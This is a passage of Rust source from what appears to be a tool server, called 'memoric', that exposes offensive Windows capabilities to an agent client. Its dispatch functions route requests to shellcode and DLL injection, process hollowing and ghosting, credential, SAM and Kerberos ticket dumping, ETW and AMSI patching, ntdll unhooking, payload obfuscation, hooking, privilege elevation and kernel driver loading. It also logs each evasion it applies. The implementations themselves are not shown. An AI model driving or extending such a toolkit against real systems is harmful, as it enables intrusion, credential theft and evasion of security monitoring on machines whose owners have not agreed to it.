        "self" => handle_self(args),
        "orchestrate" => handle_orchestrate(args),

        _ => Err(format!(
            "Unknown tool: {}. Call `memoric` to see available tools.",
            name
        )),
    }
}

fn resolve_legacy_tool(name: &str, args: Value) -> Result<(String, Value), String> {
    match name {
        "ps" | "modules" | "threads" | "suspend_thread" | "resume_thread" => {
            tracing::warn!("Tool '{}' is deprecated, use 'target' instead", name);
            Ok(("target".to_string(), convert_legacy_target(name, args)))
        }
        "read" | "write" | "scan" | "regions" | "alloc" | "free" | "protect" => {
            tracing::warn!("Tool '{}' is deprecated, use 'memory' instead", name);
            Ok(("memory".to_string(), convert_legacy_memory(name, args)))
        }
        "inject_dll" | "spawn" | "hijack" | "pe_parse" | "obfuscate" | "inject_ctl" | "unhook" => {
            tracing::warn!(
                "Tool '{}' is deprecated, forwarding to modern equivalent",
                name
            );
            Ok(convert_legacy_error_tools(name, args))
        }
        "patch" | "syscall" | "cloak" => {
            tracing::warn!("Tool '{}' is deprecated, use 'stealth'", name);
            Ok(("stealth".to_string(), convert_legacy_stealth(name, args)))
        }
        "edr" | "vm_detect" | "anti_forensics" => {
            tracing::warn!("Tool '{}' is deprecated, use 'detect'", name);
            Ok(("detect".to_string(), convert_legacy_detect(name, args)))
        }
        "elevate" | "token" | "debug_priv" | "check_admin" => {
            tracing::warn!("Tool '{}' is deprecated, use 'privilege'", name);
            Ok((
                "privilege".to_string(),
                convert_legacy_privilege(name, args),
            ))
        }
        "driver" | "kernel_read" | "kernel_write" | "kernel_op" | "bruteforce" | "sniff" => {
            tracing::warn!("Tool '{}' is deprecated, use 'kernel'", name);
            Ok(("kernel".to_string(), convert_legacy_kernel(name, args)))
        }
        "self_protect" => {
            tracing::warn!("Tool '{}' is deprecated, use 'self'", name);
            Ok(("self".to_string(), convert_legacy_self_protect(args)))
        }
        "peb" | "heap" | "self_test" | "status" => {
            tracing::warn!("Tool '{}' is deprecated, use 'self'", name);
            Ok(("self".to_string(), convert_legacy_self(name, args)))
        }
        _ => Err(format!(
            "Unknown tool: {}. Call `memoric` to see available tools.",
            name
        )),
    }
}

pub fn call_tool(name: &str, args: Value) -> Result<Value, String> {
    let (resolved_name, resolved_args) = match name {
        "memoric" | "target" | "memory" | "inject" | "payload" | "hook" | "stealth" | "detect"
        | "privilege" | "kernel" | "self" | "orchestrate" => (name.to_string(), args),
        _ => resolve_legacy_tool(name, args)?,
    };

    let normalized_args = normalize_common_args(&resolved_name, &resolved_args);
    let result = dispatch_standard_tool(&resolved_name, &normalized_args);

    // Auto-populate session state on successful operations
    if let Ok(ref _val) = result {
        record_state_trace(&resolved_name, &normalized_args);
    }

    result
}

/// Lightweight state recording after successful tool dispatch
fn record_state_trace(tool: &str, args: &Value) {
    let action = args.get("action").and_then(|v| v.as_str()).unwrap_or("");
    let pid = args.get("pid").and_then(|v| v.as_u64());

    match tool {
        "stealth" => {
            let status = "applied";
            match action {
                "patch_etw" => {
                    crate::state::record_evasion("patch_etw", "ETW", status);
                }
                "patch_amsi" => {
                    crate::state::record_evasion("patch_amsi", "AMSI", status);
                }
                "unhook_ntdll" => {
                    crate::state::record_evasion("unhook_ntdll", "ntdll.dll", status);
                }
                "hide_module" => {
                    crate::state::record_evasion("hide_module", "PEB", status);
                }
                "sleep_ekko" | "sleep_foliage" | "sleep_gargoyle" | "sleep_death" => {
                    crate::state::record_evasion(action, "sleep", status);
                }
                _ => {}
            }
        }
        "inject" => {
            if let Some(p) = pid {
                let sc_size = args
                    .get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|a| a.len())
                    .unwrap_or(0);
                if sc_size > 0 {
                    crate::state::record_injection(p as u32, action, sc_size);
                }
            }
        }
        "detect" if action == "edr_products" => {
            // State recording is done inside handle_detect when result JSON is available
        }
        "kernel" => {
            if action == "driver_load" {
                if let Some(driver) = args.get("driver").and_then(|v| v.as_str()) {
                    let path = args
                        .get("driver_path")
                        .and_then(|v| v.as_str())
                        .unwrap_or("");
                    crate::state::record_driver(driver, path, &["kernel_rw"]);
                }
            }
        }
        _ => {}
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// Consolidated Handlers
// ═════════════════════════════════════════════════════════════════════════════

fn handle_target(args: &Value) -> Result<Value, String> {
    let action = require_action(args, "target", TARGET_ACTIONS)?;

    match action {
        // Process operations
        "ps_list" => crate::info::list_processes(args).map_err(|e| e.to_string()),
        "ps_find" => crate::info::find_process(args).map_err(|e| e.to_string()),
        "ps_info" => {
            if let Some(pid) = args.get("pid").and_then(|v| v.as_u64()) {
                crate::state::set_target(pid as u32);
            }
            crate::info::get_process_info(args).map_err(|e| e.to_string())
        }
        "modules" => crate::info::list_modules(args).map_err(|e| e.to_string()),

        // Thread operations
        "threads" => {
            if args.get("tid").is_some() {
                tracing::warn!(
                    "target(action='threads', tid=...) is deprecated, use action='thread_context'"
                );
                crate::info::get_thread_context(args).map_err(|e| e.to_string())
            } else {
                crate::info::list_threads(args).map_err(|e| e.to_string())
            }
        }
        "threads_list" => crate::info::list_threads(args).map_err(|e| e.to_string()),
        "thread_suspend" => crate::info::suspend_thread(args).map_err(|e| e.to_string()),
        "thread_resume" => crate::info::resume_thread(args).map_err(|e| e.to_string()),
        "thread_context" => crate::info::get_thread_context(args).map_err(|e| e.to_string()),

        // Handle enumeration
        "handles" => crate::info::handles::enum_handles(args).map_err(|e| e.to_string()),

        // Environment
        "env" => crate::info::environment::get_environment(args).map_err(|e| e.to_string()),
        "cmdline" => crate::info::environment::get_command_line(args).map_err(|e| e.to_string()),

        // Window enumeration
        "windows" => crate::info::window::enum_windows(args).map_err(|e| e.to_string()),

        // Advanced memory introspection
        "peb" => crate::info::memory::read_peb(args).map_err(|e| e.to_string()),
        "module_base" => {
            let normalized =
                normalize_alias(args, "module_name", "module", "target", "module_base");
            require_u64_param(&normalized, "pid", "target", "module_base")?;
            require_str_param(
                &normalized,
                "module_name",
                "target",
                "module_base",
                Some("Provide a loaded module name, e.g. module_name='kernel32.dll'."),
            )?;
            crate::info::module::get_module_base(&normalized).map_err(|e| e.to_string())
        }
        "mem_find" => crate::info::memory::find_memory_region(args).map_err(|e| e.to_string()),
        "string_read" => {
            require_u64_param(args, "pid", "target", "string_read")?;
            require_u64_param(args, "address", "target", "string_read")?;
            crate::info::memory::read_string(args).map_err(|e| e.to_string())
        }
        "string_write" => {
            require_u64_param(args, "pid", "target", "string_write")?;
            require_u64_param(args, "address", "target", "string_write")?;
            require_str_param(
                args,
                "text",
                "target",
                "string_write",
                Some("Provide the string to write."),
            )?;
            crate::info::memory::write_string(args).map_err(|e| e.to_string())
        }

        // Thread advanced
        "callstack" => crate::info::thread::get_thread_callstack(args).map_err(|e| e.to_string()),
        "heap" => crate::info::thread::heap_query(args).map_err(|e| e.to_string()),
        "cred_dump" => crate::info::thread::dump_credentials(args).map_err(|e| e.to_string()),
        "sam_dump" => crate::info::sam::dump_sam_hive(args).map_err(|e| e.to_string()),
        "kerberos_tickets" => {
            crate::info::kerberos::extract_kerberos_tickets(args).map_err(|e| e.to_string())
        }

        _ => Err(unknown_action_error("target", action, TARGET_ACTIONS)),
    }
}

fn handle_memory(args: &Value) -> Result<Value, String> {
    let action = require_action(args, "memory", MEMORY_ACTIONS)?;

    match action {
        // Read operations
        "read" => {
            let mode = args.get("mode").and_then(|v| v.as_str()).unwrap_or("raw");
            match mode {
                "raw" | "string" => crate::memory::read_memory(args).map_err(|e| e.to_string()),
                "stealth" => crate::memory::stealth_read_memory(args).map_err(|e| e.to_string()),
                "scattered" => crate::memory::scattered_read(args).map_err(|e| e.to_string()),
                "physical" => crate::memory::read_physical_memory(args).map_err(|e| e.to_string()),
                _ => Err(invalid_choice_error(
                    "memory",
                    "read",
                    "mode",
                    mode,
                    MEMORY_READ_MODES,
                )),
            }
        }

        // Write operations
        "write" => {
            if args.get("text").is_some() {
                tracing::warn!(
                    "memory(action='write', text=...) is deprecated, use action='write_string'"
                );
                crate::info::write_string(args).map_err(|e| e.to_string())
            } else {
                let bypass = args
                    .get("bypass_protect")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(true);
                if bypass {
                    crate::inject::force_write(args).map_err(|e| e.to_string())
                } else {
                    crate::memory::write_memory(args).map_err(|e| e.to_string())
                }
            }
        }
        "write_string" => crate::info::write_string(args).map_err(|e| e.to_string()),

        // Scan operations
        "scan" => {
            let scan_mode = args
                .get("scan_mode")
                .and_then(|v| v.as_str())
                .unwrap_or("exact");
            match scan_mode {
                "exact" => crate::memory::scan_exact(args).map_err(|e| e.to_string()),
                "changed" => crate::memory::scan_changed(args).map_err(|e| e.to_string()),
                "pattern" => crate::memory::ida_pattern_scan(args).map_err(|e| e.to_string()),
                "stealth_pattern" => {
                    crate::memory::stealth_pattern_scan(args).map_err(|e| e.to_string())
                }
                "range" => crate::memory::scan_range(args).map_err(|e| e.to_string()),
                "delta" => crate::memory::scan_delta(args).map_err(|e| e.to_string()),
                "string" => crate::memory::scan_string(args).map_err(|e| e.to_string()),
                "unknown" => crate::memory::scan_unknown(args).map_err(|e| e.to_string()),
                "pointer" => crate::memory::pointer_scan(args).map_err(|e| e.to_string()),
                "aob" => crate::memory::find_pattern(args).map_err(|e| e.to_string()),
                "aligned" => crate::memory::scan_aligned(args).map_err(|e| e.to_string()),
                "multi" => crate::memory::scan_multi_value(args).map_err(|e| e.to_string()),
                _ => Err(invalid_choice_error(
                    "memory",
                    "scan",
                    "scan_mode",
                    scan_mode,
                    MEMORY_SCAN_MODES,
                )),
            }
        }

        // Memory management
        "query" => {
            if args.get("filter").is_some() {
                tracing::warn!(
                    "memory(action='query', filter=...) is deprecated, use action='query_find'"
                );
                let mut modified = args.clone();
                if let Some(filter) = args.get("filter") {
                    modified
                        .as_object_mut()
                        .map(|m| m.insert("type".to_string(), filter.clone()));
                }
                crate::info::find_memory_region(&modified).map_err(|e| e.to_string())
            } else {
                crate::memory::query_regions(args).map_err(|e| e.to_string())
            }
        }
        "query_find" => {
            let mut modified = args.clone();
            if let Some(filter) = args.get("filter") {
                modified
                    .as_object_mut()
                    .map(|m| m.insert("type".to_string(), filter.clone()));
            }
            crate::info::find_memory_region(&modified).map_err(|e| e.to_string())
        }
        "alloc" => {
            require_u64_param(args, "pid", "memory", "alloc")?;
            require_nonzero_usize_param(args, "size", "memory", "alloc")?;
            crate::memory::virtual_alloc_ex(args).map_err(|e| e.to_string())
        }
        "free" => {
            require_u64_param(args, "pid", "memory", "free")?;
            require_u64_param(args, "address", "memory", "free")?;
            crate::memory::virtual_free_ex(args).map_err(|e| e.to_string())
        }
        "protect" => {
            require_u64_param(args, "pid", "memory", "protect")?;
            require_u64_param(args, "address", "memory", "protect")?;
            if args.get("size").is_some() {
                require_nonzero_usize_param(args, "size", "memory", "protect")?;
            }
            crate::memory::virtual_protect_ex(args).map_err(|e| e.to_string())
        }

        // Scan session (Cheat Engine-style persistent scan workflow)
        "scan_new" => crate::memory::session::scan_new(args),
        "scan_next" => crate::memory::session::scan_next(args),
        "scan_undo" => crate::memory::session::scan_undo(args),
        "scan_list" => crate::memory::session::scan_list(args),
        "scan_reset" => crate::memory::session::scan_reset(args),
        "scan_freeze" => crate::memory::session::scan_freeze(args),

        _ => Err(unknown_action_error("memory", action, MEMORY_ACTIONS)),
    }
}

fn handle_inject(args: &Value) -> Result<Value, String> {
    let action = require_action(args, "inject", INJECT_ACTIONS)?;

    match action {
        // Shellcode injection
        "shellcode" => {
            let method = args
                .get("method")
                .and_then(|v| v.as_str())
                .unwrap_or("thread");
            match method {
                "thread" | "apc" | "special_apc" | "mapping" | "mockingjay" | "atom"
                | "callback_enum" | "propagate" | "instrumentation" | "kernel_callback"
                | "stomp" | "threadless" | "workitem" | "pool_party" => {
                    require_u64_param(args, "pid", "inject", "shellcode")?;
                    if !matches!(method, "mockingjay") {
                        require_str_param(
                            args,
                            "shellcode",
                            "inject",
                            "shellcode",
                            Some("Provide shellcode bytes. Use a byte array for most methods, or base64 text for wow64/heaven_gate."),
                        ).or_else(|_| {
                            args.get("shellcode")
                                .and_then(|v| v.as_array())
                                .map(|_| "ok")
                                .ok_or_else(|| missing_param_error("inject", "shellcode", "shellcode", Some("Provide shellcode bytes. Use a byte array for most methods, or base64 text for wow64/heaven_gate.")))
                        })?;
                    }
                }
                "wow64" | "heaven_gate" => {
                    if method == "wow64" {
                        require_u64_param(args, "pid", "inject", "shellcode")?;
                    }
                    require_str_param(
                        args,
                        "shellcode",
                        "inject",
                        "shellcode",
                        Some("Provide base64-encoded shellcode for wow64/heaven_gate execution."),
                    )?;
                }
                _ => {
                    return Err(invalid_choice_error(
                        "inject",
                        "shellcode",
                        "method",
                        method,
                        INJECT_SHELLCODE_METHODS,
                    ))
                }
            }

            match method {
                "thread" => crate::inject::inject_shellcode(args).map_err(|e| e.to_string()),
                "apc" => crate::redteam::apc_inject(args).map_err(|e| e.to_string()),
                "special_apc" => {
                    crate::inject::thread::special_apc_inject(args).map_err(|e| e.to_string())
                }
                "mapping" => crate::inject::hollow::mapping_inject(args).map_err(|e| e.to_string()),
                "mockingjay" => {
                    crate::inject::hollow::mockingjay_inject(args).map_err(|e| e.to_string())
                }
                "atom" => crate::inject::callback::atom_bombing(args).map_err(|e| e.to_string()),
                "callback_enum" => {
                    crate::inject::callback::callback_inject_enum(args).map_err(|e| e.to_string())
                }
                "propagate" => {
                    crate::inject::callback::propagate_inject(args).map_err(|e| e.to_string())
                }
                "instrumentation" => crate::inject::callback::instrumentation_callback(args)
                    .map_err(|e| e.to_string()),
                "kernel_callback" => crate::inject::callback::kernel_callback_table_hijack(args)
                    .map_err(|e| e.to_string()),
                "wow64" => {
                    crate::inject::wow64::wow64_inject_shellcode(args).map_err(|e| e.to_string())
                }
                "heaven_gate" => {
                    crate::inject::wow64::heaven_gate_execute(args).map_err(|e| e.to_string())
                }
                "stomp" => {
                    crate::inject::stomping::module_stomping_inject(args).map_err(|e| e.to_string())
                }
                "threadless" => {
                    crate::inject::threadless::threadless_inject(args).map_err(|e| e.to_string())
                }
                "workitem" => {
                    crate::inject::workitem::work_item_inject(args).map_err(|e| e.to_string())
                }
                "pool_party" => {
                    crate::inject::poolparty::pool_party_inject(args).map_err(|e| e.to_string())
                }
                _ => Err(invalid_choice_error(
                    "inject",
                    "shellcode",
                    "method",
                    method,
                    INJECT_SHELLCODE_METHODS,
                )),
            }
        }

        // DLL injection
        "dll" => {
            let dll_method = args
                .get("dll_method")
                .and_then(|v| v.as_str())
                .unwrap_or("classic");
            require_u64_param(args, "pid", "inject", "dll")?;
            require_str_param(
                args,
                "dll_path",
                "inject",
                "dll",
                Some("Provide the DLL path to inject, e.g. dll_path='C:\\temp\\payload.dll'."),
            )?;
            match dll_method {
                "classic" => crate::inject::inject_dll(args).map_err(|e| e.to_string()),
                "manual_map" => {
                    crate::inject::dll::manual_map_inject(args).map_err(|e| e.to_string())
                }
                "phantom" => {
                    crate::inject::phantom::phantom_dll_inject(args).map_err(|e| e.to_string())
                }
                "reflective" => {
                    crate::inject::dll::reflective_dll_inject(args).map_err(|e| e.to_string())
                }
                _ => Err(invalid_choice_error(
                    "inject",
                    "dll",
                    "dll_method",
                    dll_method,
                    INJECT_DLL_METHODS,
                )),
            }
        }

        // Process spawning
        "spawn" => {
            let spawn_method = args
                .get("spawn_method")
                .and_then(|v| v.as_str())
                .unwrap_or("hollow");
            let normalized = normalize_alias(args, "target_exe", "target_path", "inject", "spawn");
            require_str_param(
                &normalized,
                "target_exe",
                "inject",
                "spawn",
                Some("Provide the executable path to launch or hollow."),
            )?;
            match spawn_method {
                "hollow" => {
                    require_str_param(
                        &normalized,
                        "payload",
                        "inject",
                        "spawn",
                        Some("Provide PE payload bytes for hollow/transacted spawn methods."),
                    ).or_else(|_| {
                        normalized
                            .get("payload")
                            .and_then(|v| v.as_array())
                            .map(|_| "ok")
                            .ok_or_else(|| missing_param_error("inject", "spawn", "payload", Some("Provide PE payload bytes for hollow/transacted spawn methods.")))
                    })?;
                    crate::inject::hollow::process_hollow(&normalized).map_err(|e| e.to_string())
                }
                "ghost" => {
                    crate::evasion::ghost::process_ghost(&normalized).map_err(|e| e.to_string())
                }
                "doppelgang" => crate::evasion::doppel::process_doppelgang(&normalized)
                    .map_err(|e| e.to_string()),
                "herpaderp" => crate::evasion::herpaderp::process_herpaderp(&normalized)
                    .map_err(|e| e.to_string()),
                "early_bird" => {
                    require_str_param(
                        &normalized,
                        "shellcode",
                        "inject",
                        "spawn",
                        Some("Provide shellcode bytes for early_bird spawn."),
                    )
                    .or_else(|_| {
                        normalized
                            .get("shellcode")
                            .and_then(|v| v.as_array())
                            .map(|_| "ok")
                            .ok_or_else(|| {
                                missing_param_error(
                                    "inject",
                                    "spawn",
                                    "shellcode",
                                    Some("Provide shellcode bytes for early_bird spawn."),
                                )
                            })
                    })?;
                    crate::inject::earlybird::early_bird_inject(&normalized)
                        .map_err(|e| e.to_string())
                }
                "transacted" => {
                    require_str_param(
                        &normalized,
                        "payload",
                        "inject",
                        "spawn",
                        Some("Provide PE payload bytes for hollow/transacted spawn methods."),
                    ).or_else(|_| {
                        normalized
                            .get("payload")
                            .and_then(|v| v.as_array())
                            .map(|_| "ok")
                            .ok_or_else(|| missing_param_error("inject", "spawn", "payload", Some("Provide PE payload bytes for hollow/transacted spawn methods.")))
                    })?;
                    crate::inject::hollow::transacted_hollow(&normalized).map_err(|e| e.to_string())
                }
                _ => Err(invalid_choice_error(
                    "inject",
                    "spawn",
                    "spawn_method",
                    spawn_method,
                    INJECT_SPAWN_METHODS,
                )),
            }
        }

        // Thread hijacking workflow
        "hijack_enum" => {
            require_u64_param(args, "pid", "inject", "hijack_enum")?;
            crate::inject::enumerate_threads(args).map_err(|e| e.to_string())
        }
        "hijack_backup" => {
            require_u64_param(args, "tid", "inject", "hijack_backup")?;
            crate::inject::backup_thread_context(args).map_err(|e| e.to_string())
        }
        "hijack_redirect" => {
            require_u64_param(args, "tid", "inject", "hijack_redirect")?;
            crate::inject::thread_hijack(args).map_err(|e| e.to_string())
        }
        "hijack_restore" => {
            require_u64_param(args, "tid", "inject", "hijack_restore")?;
            crate::inject::restore_thread_context(args).map_err(|e| e.to_string())
        }
        "hijack_wait" => {
            require_u64_param(args, "tid", "inject", "hijack_wait")?;
            crate::inject::wait_for_thread_execution(args).map_err(|e| e.to_string())
        }

        // Direct thread creation
        "create_remote_thread" => {
            require_u64_param(args, "pid", "inject", "create_remote_thread")?;
            let normalized = normalize_alias(
                args,
                "start_address",
                "address",
                "inject",
                "create_remote_thread",
            );
            require_u64_param(
                &normalized,
                "start_address",
                "inject",
                "create_remote_thread",
            )?;
            crate::inject::shellcode::create_remote_thread(&normalized).map_err(|e| e.to_string())
        }
        "nt_create_thread" => {
            require_u64_param(args, "pid", "inject", "nt_create_thread")?;
            let normalized = normalize_alias(
                args,
                "start_address",
                "address",
                "inject",
                "nt_create_thread",
            );
            require_u64_param(&normalized, "start_address", "inject", "nt_create_thread")?;
            crate::inject::shellcode::nt_create_thread_ex(&normalized).map_err(|e| e.to_string())
        }

        // Fiber & thread pool injection
        "fiber" => {
            require_u64_param(args, "pid", "inject", "fiber")?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "fiber",
                Some("Provide shellcode bytes for fiber injection."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "fiber",
                            "shellcode",
                            Some("Provide shellcode bytes for fiber injection."),
                        )
                    })
            })?;
            crate::inject::thread::fiber_inject(args).map_err(|e| e.to_string())
        }
        "threadpool" => {
            require_u64_param(args, "pid", "inject", "threadpool")?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "threadpool",
                Some("Provide shellcode bytes for threadpool injection."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "threadpool",
                            "shellcode",
                            Some("Provide shellcode bytes for threadpool injection."),
                        )
                    })
            })?;
            crate::inject::thread::threadpool_inject(args).map_err(|e| e.to_string())
        }
        "stack_bomb" => {
            require_u64_param(args, "pid", "inject", "stack_bomb")?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "stack_bomb",
                Some("Provide shellcode bytes for stack bomb injection."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "stack_bomb",
                            "shellcode",
                            Some("Provide shellcode bytes for stack bomb injection."),
                        )
                    })
            })?;
            crate::inject::thread::stack_bomb(args).map_err(|e| e.to_string())
        }

        // Pool Party variants
        "pool_party_worker" => {
            require_u64_param(args, "pid", "inject", "pool_party_worker")?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "pool_party_worker",
                Some("Provide shellcode bytes for Pool Party execution."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "pool_party_worker",
                            "shellcode",
                            Some("Provide shellcode bytes for Pool Party execution."),
                        )
                    })
            })?;
            crate::inject::poolparty::pool_party_worker_factory(args).map_err(|e| e.to_string())
        }
        "pool_party_work" => {
            require_u64_param(args, "pid", "inject", "pool_party_work")?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "pool_party_work",
                Some("Provide shellcode bytes for Pool Party execution."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "pool_party_work",
                            "shellcode",
                            Some("Provide shellcode bytes for Pool Party execution."),
                        )
                    })
            })?;
            crate::inject::poolparty::pool_party_tp_work(args).map_err(|e| e.to_string())
        }
        "pool_party_direct" => {
            require_u64_param(args, "pid", "inject", "pool_party_direct")?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "pool_party_direct",
                Some("Provide shellcode bytes for Pool Party execution."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "pool_party_direct",
                            "shellcode",
                            Some("Provide shellcode bytes for Pool Party execution."),
                        )
                    })
            })?;
            crate::inject::poolparty::pool_party_tp_direct(args).map_err(|e| e.to_string())
        }
        "pool_party_timer" => {
            require_u64_param(args, "pid", "inject", "pool_party_timer")?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "pool_party_timer",
                Some("Provide shellcode bytes for Pool Party execution."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "pool_party_timer",
                            "shellcode",
                            Some("Provide shellcode bytes for Pool Party execution."),
                        )
                    })
            })?;
            crate::inject::poolparty::pool_party_tp_timer(args).map_err(|e| e.to_string())
        }

        // Advanced DLL injection
        "export_forward" => {
            require_u64_param(args, "pid", "inject", "export_forward")?;
            require_str_param(
                args,
                "module",
                "inject",
                "export_forward",
                Some("Provide the loaded module name whose export table will be patched."),
            )?;
            require_str_param(
                args,
                "export_name",
                "inject",
                "export_forward",
                Some("Provide the exported symbol name to redirect."),
            )?;
            require_str_param(
                args,
                "shellcode",
                "inject",
                "export_forward",
                Some("Provide shellcode bytes to receive redirected export execution."),
            )
            .or_else(|_| {
                args.get("shellcode")
                    .and_then(|v| v.as_array())
                    .map(|_| "ok")
                    .ok_or_else(|| {
                        missing_param_error(
                            "inject",
                            "export_forward",
                            "shellcode",
                            Some("Provide shellcode bytes to receive redirected export execution."),
                        )
                    })
            })?;
            crate::inject::dll::export_forwarding_hijack(args).map_err(|e| e.to_string())
        }
        "phantom_hollow" => {
            require_u64_param(args, "pid", "inject", "phantom_hollow")?;
            require_str_param(
                args,
                "dll_path",
                "inject",
                "phantom_hollow",
                Some("Provide the DLL path for phantom hollowing."),
            )?;
            crate::inject::hollow::phantom_dll_hollow(args).map_err(|e| e.to_string())
        }
        "transacted_hollow" => {
            require_u64_param(args, "pid", "inject", "transacted_hollow")?;
            require_str_param(
                args,
                "dll_path",
                "inject",
                "transacted_hollow",
                Some("Provide the DLL path for transacted hollowing."),
            )?;
            crate::inject::phantom::transacted_hollowing(args).map_err(|e| e.to_string())
        }

        // WoW64 detection
        "wow64_detect" => {
            require_u64_param(args, "pid", "inject", "wow64_detect")?;
            crate::inject::wow64::detect_wow64_mismatch(args).map_err(|e| e.to_string())
        }

        _ => Err(unknown_action_error("inject", action, INJECT_ACTIONS)),
    }
}

fn handle_payload(args: &Value) -> Result<Value, String> {
    let action = require_action(args, "payload", PAYLOAD_ACTIONS)?;

    match action {
        // PE parsing
        "pe_parse" => {
            let show = args
                .get("show")
                .and_then(|v| v.as_str())
                .unwrap_or("headers");
            match show {
                "headers" | "imports" | "exports" | "sections" => {
                    crate::inject::parse_pe_headers(args).map_err(|e| e.to_string())
                }
                "iat_entry" => crate::inject::find_iat_entry(args).map_err(|e| e.to_string()),
                _ => Err(invalid_choice_error(
                    "payload",
                    "pe_parse",
                    "show",
                    show,
                    PAYLOAD_SHOW_OPTIONS,
                )),
            }
        }

        // Obfuscation
        "obfuscate" => {
            let obf_method = require_str_param(
                args,
                "obf_method",
                "payload",
                "obfuscate",
                Some("Choose one of: xor, rc4, aes_ctr, polymorphic, uuid, ipv4, mac, transform, strings."),
            )?;
            match obf_method {
                "xor" => crate::inject::obfuscate::xor_encrypt(args).map_err(|e| e.to_string()),
                "rc4" => crate::inject::obfuscate::rc4_encrypt(args).map_err(|e| e.to_string()),
                "aes_ctr" => {
                    crate::inject::obfuscate::aes_ctr_encrypt(args).map_err(|e| e.to_string())
                }
                "polymorphic" => {
                    crate::inject::obfuscate::polymorphic_encode(args).map_err(|e| e.to_string())
                }
                "uuid" => crate::inject::obfuscate::uuid_encode(args).map_err(|e| e.to_string()),
                "ipv4" => crate::inject::obfuscate::ipv4_encode(args).map_err(|e| e.to_string()),
                "mac" => crate::inject::obfuscate::mac_encode(args).map_err(|e| e.to_string()),
                "transform" => {
                    crate::inject::obfuscate::transform_shellcode(args).map_err(|e| e.to_string())
                }
                "strings" => {
                    crate::inject::obfuscate::obfuscate_strings(args).map_err(|e| e.to_string())
                }
                _ => Err(invalid_choice_error(
                    "payload",
                    "obfuscate",
                    "obf_method",
                    obf_method,
                    PAYLOAD_OBF_METHODS,
                )),
            }
        }

        // Lifecycle control
        "wait" => crate::inject::wait_for_execution(args).map_err(|e| e.to_string()),
        "exit_code" => crate::inject::get_exit_code(args).map_err(|e| e.to_string()),
        "cleanup" => crate::inject::cleanup_injection(args).map_err(|e| e.to_string()),
        "serialize" => crate::inject::serialize_params(args).map_err(|e| e.to_string()),

        _ => Err(unknown_action_error("payload", action, PAYLOAD_ACTIONS)),
    }
}

fn handle_hook(args: &Value) -> Result<Value, String> {
    let action = require_action(args, "hook", HOOK_ACTIONS)?;

    match action {
        // Install hooks
        "hook_function" | "install" | "install_iat" => {
            let normalized = normalize_alias(args, "function", "target_function", "hook", action);
            let method = if action == "install_iat" {
                "iat"
            } else {
                normalized
                    .get("method")
                    .and_then(|v| v.as_str())
                    .unwrap_or("iat")
            };

            match method {
                "iat" => {
                    require_u64_param(&normalized, "pid", "hook", action)?;
                    require_str_param(
                        &normalized,
                        "module",
                        "hook",
                        action,
                        Some("Provide the imported module name, e.g. module='kernel32.dll'."),
                    )?;
                    require_str_param(
                        &normalized,
                        "function",
                        "hook",
                        action,
                        Some(
                            "Provide the imported function to patch, e.g. function='CreateFileW'.",
                        ),
                    )?;
                    require_u64_param(&normalized, "hook_address", "hook", action)?;
                    crate::inject::hook::hook_function_iat(&normalized).map_err(|e| e.to_string())
                }
                "inline" => {
                    require_u64_param(&normalized, "pid", "hook", action)?;
                    require_u64_param(&normalized, "target_address", "hook", action)?;
                    require_u64_param(&normalized, "hook_address", "hook", action)?;
                    crate::inject::hook::inline_hook(&normalized).map_err(|e| e.to_string())
                }
                _ => Err(invalid_choice_error(
                    "hook",
                    action,
                    "method",
                    method,
                    HOOK_METHODS,
                )),
            }
        }
        "install_hwbp" => {
            require_u64_param(args, "target_address", "hook", "install_hwbp")?;
            crate::evasion::hwbp::hwbp_hook(args).map_err(|e| e.to_string())
        }

        // Remove hooks
        "remove" | "remove_iat" => {
            require_u64_param(args, "pid", "hook", action)?;
            require_u64_param(args, "iat_address", "hook", action)?;
            require_u64_param(args, "original_address", "hook", action)?;
            crate::inject::iat_unhook(args).map_err(|e| e.to_string())
        }
        "remove_hwbp" => crate::evasion::hwbp::hwbp_unhook(args).map_err(|e| e.to_string()),

        // Advanced hooking
        "trampoline" => {
            require_u64_param(args, "pid", "hook", "trampoline")?;
            require_u64_param(args, "target_address", "hook", "trampoline")?;
            crate::inject::hook::generate_trampoline(args).map_err(|e| e.to_string())
        }
        "detour" => crate::inject::hook::detour_transaction(args).map_err(|e| e.to_string()),
        "restore" => crate::inject::hook::restore_hook(args).map_err(|e| e.to_string()),
        "winhook" => {
            require_u64_param(args, "pid", "hook", "winhook")?;
            crate::inject::hook::set_windows_hook_inject(args).map_err(|e| e.to_string())
        }
        "hwbp_syscall" => crate::evasion::hwbp::hwbp_syscall_hook(args).map_err(|e| e.to_string()),

        _ => Err(unknown_action_error("hook", action, HOOK_ACTIONS)),
    }
}

fn handle_stealth(args: &Value) -> Result<Value, String> {
    let action = require_action(args, "stealth", STEALTH_ACTIONS)?;

    match action {
        // Patching
        "patch_etw" => crate::evasion::etw::etw_bypass(args).map_err(|e| e.to_string()),
